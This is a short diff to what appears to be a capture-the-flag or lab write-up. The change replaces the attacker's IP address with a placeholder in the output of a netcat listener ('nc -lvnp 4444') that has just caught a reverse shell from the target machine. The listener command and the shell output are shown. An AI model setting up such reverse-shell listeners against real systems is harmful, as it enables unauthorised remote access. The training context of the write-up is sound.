@@ -241,7 +241,7 @@ BOOM! We got a shell :)
 ```shell
 $ nc -lvnp 4444 
 listening on [any] 4444 ...
-connect to [10.8.122.251] from (UNKNOWN) [10.10.151.145] 32879
+connect to [IP] from (UNKNOWN) [10.10.151.145] 32879
 Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
  15:27:12 up  1:02,  0 users,  load average: 1.95, 1.66, 0.96
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
